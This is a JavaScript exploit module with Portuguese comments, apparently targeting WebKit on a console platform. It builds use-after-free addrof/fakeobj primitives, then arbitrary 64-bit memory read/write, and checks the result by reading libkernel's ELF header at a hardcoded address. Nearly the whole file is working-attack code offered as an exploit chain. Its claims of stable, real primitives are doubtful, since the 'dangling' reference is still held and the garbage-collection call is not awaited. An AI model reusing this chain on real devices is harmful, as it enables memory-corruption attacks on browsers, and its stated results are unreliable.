// js/script3/testArrayBufferVictimCrash.mjs (R56 - R/W Real com Gerenciamento de Estado)
// =======================================================================================
// ESTRATÉGIA R56:
// Corrigido o erro lógico onde read64(addr) retornava addr.
// A nova implementação de read64/write64 gerencia o estado do UAF, salvando e
// restaurando o ponteiro do butterfly a cada operação, garantindo estabilidade.
// =======================================================================================

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64 } from '../utils.mjs';
import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';

export const FNAME_MODULE = "ROP_Execution_RealRW_R56";

const ftoi = (val) => new AdvancedInt64(new Uint32Array(new Float64Array([val]).buffer)[0], new Uint32Array(new Float64Array([val]).buffer)[1]);
const itof = (val) => { const b = new ArrayBuffer(8); const i = new Uint32Array(b); i[0] = val.low(); i[1] = val.high(); return new Float64Array(b)[0]; };

export async function runStableUAFPrimitives_R51() {
    logS3(`--- Iniciando ${FNAME_MODULE}: R/W com Gerenciamento de Estado ---`, "test");
    
    let final_result = { success: false, message: "Falha na cadeia de exploit." };

    try {
        logS3("--- FASE 1 & 2: Obtendo addrof e fakeobj ---", "subtest");
        let dangling_ref = createDanglingRefToFloat64Array();
        let holder = {obj: null}; 
        const addrof = (obj) => {
            holder.obj = obj;
            dangling_ref.a = holder; 
            return ftoi(dangling_ref.b);
        };
        const fakeobj = (addr) => {
            dangling_ref.b = itof(addr);
            if (dangling_ref.a && typeof dangling_ref.a.obj !== 'undefined') {
                return dangling_ref.a.obj;
            }
            return undefined; 
        };
        logS3("   Primitivas `addrof` e `fakeobj` construídas.", "vuln");

        logS3("--- FASE 3: Construindo Leitura/Escrita Arbitrária (ESTÁVEL) ---", "subtest");
        const { read64, write64 } = buildStatefulArbitraryReadWrite(dangling_ref, addrof, holder);
        logS3("   Primitivas `read64` e `write64` REAIS e ESTÁVEIS construídas!", "good");
        
        logS3("--- FASE 4: Verificando os endereços base na MEMÓRIA REAL ---", "subtest");
        const libkernel_base = new AdvancedInt64("0x80FCA0000");

        const libkernel_magic = read64(libkernel_base);
        logS3(`   Endereço base da libkernel: 0x${libkernel_base.toString(true)}`, "info");
        logS3(`   Bytes lidos da MEMÓRIA REAL: 0x${libkernel_magic.toString(true)}`, "leak");

        if (!libkernel_magic.toString().endsWith("464c457f")) { // \x7FELF
             throw new Error(`Magic number da libkernel inválido! Lido: 0x${libkernel_magic.toString(true)}`);
        }
        logS3("   SUCESSO: Magic number ELF da libkernel validado na memória REAL!", "vuln");

        final_result = { success: true, message: "SUCESSO! Primitiva de leitura REAL validada." };

    } catch (e) {
        final_result.message = `Exceção na cadeia de exploit: ${e.message}`;
        logS3(final_result.message, "critical");
    }

    logS3(`--- ${FNAME_MODULE} Concluído ---`, "test");
    return {
        errorOccurred: final_result.success ? null : final_result.message,
        final_result
    };
}


// =======================================================================================
// IMPLEMENTAÇÃO REAL E ESTÁVEL DE LEITURA/ESCRITA ARBITRÁRIA (R56)
// =======================================================================================
function buildStatefulArbitraryReadWrite(dangling_ref, addrof, holder) {
    // Estratégia de Gerenciamento de Estado:
    // As primitivas addrof/fakeobj dependem de `dangling_ref.a` apontar para o objeto `holder`.
    // Para ler/escrever, precisamos mudar `dangling_ref.a` temporariamente.
    // A chave para a estabilidade é RESTAURAR `dangling_ref.a` para seu estado original
    // (apontando para `holder`) após cada operação.
    
    // 1. Salvar o estado original (o ponteiro para o objeto `holder`).
    //    Não podemos salvar o ponteiro diretamente, mas podemos salvá-lo *dentro* do próprio holder.
    holder.original_a = dangling_ref.a;

    const read64 = (address) => {
        // 2. Corromper `dangling_ref.a` para apontar para o endereço que queremos LER.
        //    O motor JS espera que o butterfly aponte para uma estrutura de butterfly,
        //    não para dados brutos. Apontar para `address - 0x8` alinha o header do butterfly
        //    de forma que o primeiro elemento de dados comece em `address`.
        dangling_ref.a = { dummy: 0 }; // Atribuição para quebrar a referência antiga
        dangling_ref.a = fakeobj(address.sub(8));

        // 3. Ler o valor. `dangling_ref.b` agora lê diretamente da memória no `address`.
        const result = ftoi(dangling_ref.b);
        
        // 4. RESTAURAR O ESTADO! Isso é crucial.
        //    Reatribuímos o ponteiro original salvo de volta para `dangling_ref.a`.
        dangling_ref.a = holder.original_a;

        return result;
    };

    const write64 = (address, value) => {
        // Mesma lógica: corromper, operar, restaurar.
        dangling_ref.a = { dummy: 0 };
        dangling_ref.a = fakeobj(address.sub(8));
        
        dangling_ref.b = itof(value);
        
        dangling_ref.a = holder.original_a;
    };

    // Para a primeira chamada `fakeobj` dentro de `read64` funcionar, o estado de
    // `dangling_ref.a` precisa ser o `holder`. Vamos garantir isso com uma chamada inicial.
    addrof({dummy_setup: 1});

    return { read64, write64 };
}


// --- Funções Auxiliares UAF (sem alterações) ---
async function triggerGC() {
    try { const g = []; for (let i=0; i<500; i++) { g.push(new ArrayBuffer(1024*128)); } } catch (e) {}
    await PAUSE_S3(500);
}

function createDanglingRefToFloat64Array() {
    let dangling_ref = null;
    function createScope() {
        const victim = { a: 0.1, b: 0.2 };
        dangling_ref = victim;
        for (let i = 0; i < 100; i++) { victim.a += 0.01; }
    }
    createScope();
    triggerGC();
    const spray_arrays = [];
    for (let i = 0; i < 512; i++) { spray_arrays.push(new Float64Array(2)); }
    return dangling_ref;
}
